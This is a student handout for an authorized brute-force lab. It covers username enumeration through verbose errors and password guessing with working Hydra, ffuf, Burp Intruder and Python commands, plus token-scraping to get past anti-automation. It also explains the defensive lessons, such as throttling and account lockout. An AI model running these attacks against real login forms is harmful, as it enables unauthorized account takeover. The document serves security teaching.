# Student Guide — Brute Force Lab

Your goal: **log into the target form without being told the password**, by
guessing systematically. When you succeed, the page shows a `FLAG{...}` —
capture it to prove you got in.

> Only attack the lab URL your instructor gave you. Brute-forcing any system
> you are not explicitly authorized to test is illegal.

Replace `TARGET` below with the lab URL (e.g. `http://192.168.1.50:5000` or
`http://localhost:5000`).

---

## Step 1 — Learn the form by hand

1. Open `TARGET` and read the home page. Set the difficulty to **low**.
2. Go to the login form. Try `admin` / `wrongpass`. Note the error.
3. Try `admin` / `password`. You're in — note the flag.

Before automating, notice the **verbose error**:
- Unknown user → "Username and/or password incorrect."
- Known user, wrong password → "Password incorrect for that user."

That difference lets you **enumerate valid usernames** first, then only
brute-force passwords for users that exist.

---

## Step 2 — Inspect the request

Open your browser's DevTools → Network tab, submit the form, and look at the
POST to `/login`. The body is:

```
username=admin&password=wrongpass
```

(On the **high** level you'll also see a `user_token` hidden field that
changes every request.)

---

## Step 3 — Automate the attack (low level)

### Option A — Hydra

```bash
hydra -l admin -P wordlists/passwords.txt TARGET_HOST http-post-form \
  "/login:username=^USER^&password=^PASS^:Password incorrect"
```

- `-l admin` — single username (use `-L usernames.txt` to try many)
- `-P wordlists/passwords.txt` — password list
- The final string is the failure condition. `TARGET_HOST` is host only,
  e.g. `192.168.1.50 -s 5000`.

### Option B — ffuf

```bash
ffuf -w wordlists/passwords.txt \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u TARGET/login \
  -fr "incorrect"
```

`-fr "incorrect"` filters out responses containing "incorrect", so only the
successful guess shows.

### Option C — Burp Suite Intruder

1. Proxy the login request through Burp, send to **Intruder**.
2. Mark the `password` value as the payload position.
3. Load `wordlists/passwords.txt` as the payload.
4. Start the attack; sort by response length — the hit stands out.

### Option D — a tiny Python script

```python
import requests

TARGET = "http://localhost:5000/login"
user = "admin"
for pw in open("wordlists/passwords.txt"):
    pw = pw.strip()
    r = requests.post(TARGET, data={"username": user, "password": pw})
    if "incorrect" not in r.text.lower():
        print(f"[+] FOUND: {user}:{pw}")
        break
```

---

## Step 4 — Climb the difficulty

- **medium**: each attempt sleeps 1.5s. Your attack still works — it just
  takes longer. Lesson: throttling buys time, it does not stop you.
- **high**: every request needs a fresh `user_token` parsed from the previous
  response. Naive tools fail. In Burp use the **Recursive grep** payload /
  macro to pull the new token each time; in Python, GET the page, scrape the
  token, then POST it. Lesson: anti-automation tokens raise the bar.
- **impossible**: after 5 wrong guesses, the account locks for 30s. An online
  dictionary attack grinds to a halt. Lesson: **account lockout** is the
  control that actually defeats online brute force. (Discuss: what are its
  downsides? Denial of service by locking out real users.)

---

## Step 5 — Write up what you learned

For each level, record: did your attack succeed, how long it took, and which
real-world defense the level represents. Then answer: **which single control
would you add to a real login form first, and why?**

Happy (authorized) hacking. 🧑‍💻
